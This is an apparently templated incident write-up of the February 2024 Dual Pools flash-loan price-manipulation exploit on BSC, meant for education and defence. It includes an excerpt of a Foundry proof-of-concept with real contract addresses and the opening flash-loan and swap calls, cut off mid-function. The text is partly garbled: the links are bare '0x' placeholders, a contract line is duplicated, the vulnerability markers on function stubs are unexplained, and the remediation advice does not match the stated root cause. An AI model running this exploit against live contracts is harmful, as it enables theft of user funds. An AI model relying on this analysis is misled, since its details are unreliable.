# Dual Pools — Price Manipulation Analysis of a Dual Pool Structure

| Item | Details |
|------|------|
| **Date** | 2024-02-06 |
| **Protocol** | Dual Pools |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Price manipulation via dual pool structure |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol) |

---
## 1. Vulnerability Overview

Dual Pools is a DeFi protocol operating on the BSC chain that suffered a **flash loan / price manipulation** attack on 2024-02-06.
The attacker exploited price manipulation in the dual pool structure, causing an estimated **unconfirmed** amount of damage.

### Core Vulnerability Summary
- **Classification**: Flash loan / Price manipulation
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Price manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Example of vulnerable implementation
// Issue: Price manipulation via dual pool structure
// The attacker exploits this logic to gain illegitimate profit

// Venus Protocol interface — functions vulnerable to dual pool price manipulation
interface IMarketFacet {
    // ❌ Vulnerable: after enterMarkets, collateral value can be inflated using momentarily manipulated price
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
    function exitMarket(address vToken) external returns (uint256);
    function updateDelegate(address delegate, bool allowBorrows) external;
    function liquidateCalculateSeizeTokens(address vTokenBorrowed, address vTokenCollateral, uint256 actualRepayAmount) external view returns (uint256, uint256);
}

interface VBep20Interface {
    // ❌ Vulnerable: double-counting can occur when mint/borrow are called sequentially after pool balance manipulation via flash loan
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// ✅ Correct implementation: validate price deviation between dual pools
function safeMint(uint256 mintAmount) external returns (uint256) {
    // ✅ Verify that both pool prices are within allowable deviation (manipulation detection)
    uint256 priceA = getPoolAPrice();
    uint256 priceB = getPoolBPrice();
    require(
        abs(priceA - priceB) * 1e18 / priceA <= MAX_PRICE_DEVIATION,
        "Mint: pool price deviation detected"
    );
    // ✅ Block mint while flash loan is active
    require(!flashActive, "Mint: flash loan active");
    return _mint(mintAmount);
}
```

---
### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Dual_decompiled.sol
contract Dual {
contract Dual {
    address public owner;


    // Selector: 0x70a08231

    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability

    // Selector: 0xb71d1a0c
    function _setPendingAdmin(address p0) external {}

    // Selector: 0xe9c714f2
    function _acceptAdmin() external {}

    // Selector: 0xf5e3c462
    function liquidateBorrow(address p0, uint256 p1, address p2) external {}

    // Selector: 0xf851a440
    function admin() external {}

    // Selector: 0xf8f9da28
    function borrowRatePerBlock() external {}

    // Selector: 0xfca7820b
    function _setReserveFactor(uint256 p0) external {}

    // Selector: 0xf2b3abbd
    function _setInterestRateModel(address p0) external {}

    // Selector: 0xf3fdb15a
    function interestRateModel() external {}

    // Selector: 0xbd6d894d
    function exchangeRateCurrent() external {}

    // Selector: 0xc37f68e2
    function getAccountSnapshot(address p0) external view returns (uint256) {}

    // Selector: 0xc5ebeaec

    function borrow(uint256 p0) external {}

    // Selector: 0xdb006a75

    // 📌 Repayment — price manipulation risk
    function redeem(uint256 p0) external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0xa0712d68
    // Alternative: f_19A4AE45(uint256,uint256)

    // 📌 Minting — unlimited issuance risk
    function mint(uint256 p0) external {}

    // Selector: 0xa6afed95
    function accrueInterest() external {}

    // Selector: 0xa9059cbb

    function transfer(address p0, uint256 p1) external {}

    // Selector: 0xaa5af0fd
    function borrowIndex() external {}

    // Selector: 0xae9d70b0
    function supplyRatePerBlock() external {}

    // Selector: 0xb2a02ff1
    function seize(address p0, address p1, uint256 p2) external {}

    // Selector: 0x73acee98
    function totalBorrowsCurrent() external view returns (uint256) {}

    // Selector: 0x852a12e3
    // 📌 Repayment — price manipulation risk
    function redeemUnderlying(uint256 p0) external {}

    // Selector: 0x8f840ddd
    function totalReserves() external view returns (uint256) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0x95dd9193
    function borrowBalanceStored(address p0) external {}

    // Selector: 0x3af9e669
    function balanceOfUnderlying(address p0) external view returns (uint256) {}

    // Selector: 0x47bd3718
    function totalBorrows() external view returns (uint256) {}

    // Selector: 0x5fe3b567
    function comptroller() external {}

    // Selector: 0x601a0bf1
    function _reduceReserves(uint256 p0) external {}

    // Selector: 0x6c540baf
    function accrualBlockNumber() external {}

    // Selector: 0x6f307dc3
    function underlying() external {}

    // Selector: 0x555bcc40
    function _setImplementation(address p0, bool p1, bytes memory p2) external {}

    // Selector: 0x5c60da1b
    function implementation() external {}

    // Selector: 0x3b1d21a2
    function getCash() external view returns (uint256) {}

    // Selector: 0x3d9ea3a1
    function isVToken() external view returns (address) {}

    // Selector: 0x3e941010
    function _addReserves(uint256 p0) external {}

    // Selector: 0x4487152f
    function delegateToViewImplementation(bytes memory p0) external {}

    // Selector: 0x4576b5db
    function _setComptroller(address p0) external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x182df0f5
    function exchangeRateStored() external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x2608f818

    function repayBorrowBehalf(address p0, uint256 p1) external {}

    // Selector: 0x26782247
    function pendingAdmin() external view returns (uint256) {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── BSC DEX/Lending
  │                       (Large token borrow)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                              (Internal state modification)
  ▼
[Illegitimate Profit Extraction] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - DualPools_exp.sol
// Chain: BSC | Date: 2024-02-06

    VBep20Interface private vLINK = VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
    VBep20Interface private vBUSD = VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    VBep20Interface private vWBNB = VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);

    VBep20Interface private dLINK = VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
    VBep20Interface private dBTCB = VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
    VBep20Interface private dWBNB = VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
    VBep20Interface private dETH = VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
    VBep20Interface private dADA = VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
    VBep20Interface private dBUSD = VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);

    IMarketFacet VenusProtocol = IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IMarketFacet Dualpools = IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);

    IDPPOracle DPPOracle_0x1b52 = IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    IDPPOracle DPPOracle_0x8191 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePair pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
    Uni_Pair_V3 pool = Uni_Pair_V3(0x172fcD41E0913e95784454622d1c3724f546f849);

    function setUp() public {
        vm.createSelectFork("bsc", 36_145_772 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(LINK), "LINK");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(ETH), "ETH");
        vm.label(address(ADA), "ADA");
        vm.label(address(vLINK), "vLINK");
        vm.label(address(vBUSD), "vBUSD");
        vm.label(address(vWBNB), "vWBNB");
        vm.label(address(VenusProtocol), "VenusProtocol");

        vm.label(address(dLINK), "dLINK");
        vm.label(address(dBTCB), "dBTCB");
        vm.label(address(dWBNB), "dWBNB");
        vm.label(address(dETH), "dETH");
        vm.label(address(dADA), "dADA");
        vm.label(address(dBUSD), "dBUSD");

        vm.label(address(Dualpools), "Dualpools");
    }

    function approveAll() internal {
        BUSD.approve(address(vBUSD), type(uint256).max);
        LINK.approve(address(vLINK), type(uint256).max);
        LINK.approve(address(dLINK), type(uint256).max);
    }

    function testAttack() public {
        approveAll();
        DPPOracle_0x1b52.flashLoan(7_001_000_000_000_000_000, 0, address(this), new bytes(1)); // borrow BUSD
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        console.log(msg.sender);
        if (msg.sender == address(DPPOracle_0x1b52)) {
            pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK
            BUSD.transfer(address(DPPOracle_0x1b52), 7_001_000_000_000_000_000);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Price manipulation |
| **Attack Type** | Flash loan attack |
| **Vulnerability Category** | Economic attack |
| **Attack Complexity** | High (flash loan required) |
| **Prerequisites** | Sufficient gas fees and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the attacked functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately notify related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on the current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / price manipulation attacks are preventable**: Proper validation and pattern application can provide a defense
2. **Consider economic incentives**: All functions must be designed with an attacker's economic motivation in mind
3. **Audit prioritization**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build a system to instantly detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response manual that can be executed immediately upon an attack
3. **Insurance**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem
- The **2024-02-06** Dual Pools incident reconfirms the danger of **flash loan / price manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol)*